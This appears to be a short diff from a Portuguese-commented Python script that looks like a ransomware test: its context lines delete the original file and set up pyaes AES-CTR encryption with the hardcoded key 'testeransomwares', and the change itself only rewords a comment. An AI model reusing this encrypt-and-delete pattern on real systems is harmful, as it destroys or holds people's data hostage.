@@ -12,7 +12,7 @@ file.close()
 
 os.remove(file_name)
 
-## chave de criptografia com 16 caracteres
+## criar chave de criptografia com 16 caracteres
 
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
